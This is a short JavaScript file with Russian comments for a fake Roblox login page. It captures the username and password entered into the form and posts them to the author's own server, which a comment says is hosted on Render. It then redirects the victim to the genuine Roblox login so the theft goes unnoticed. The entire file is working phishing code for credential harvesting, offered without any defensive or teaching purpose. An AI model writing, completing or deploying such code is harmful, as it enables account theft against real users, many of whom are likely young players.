document.addEventListener("DOMContentLoaded", () => {
    const loginForm = document.getElementById('loginForm');
    
    if (loginForm) {
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // ИСПРАВЛЕНО: теперь ищем класс .demo-submit, который ты используешь в HTML
            const loginBtn = document.querySelector('.demo-submit');
            
            if (loginBtn) {
                loginBtn.textContent = "Загрузка...";
                loginBtn.disabled = true;
            }

            try {
                // Отправляем данные на твой сервер на Render
                await fetch('/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
            } catch (error) {
                console.error("Ошибка:", error);
            }

            // Задержка и редирект на настоящий Roblox
            setTimeout(() => {
                window.location.href = "https://www.roblox.com/login";
            }, 1500);
        });
    }
});
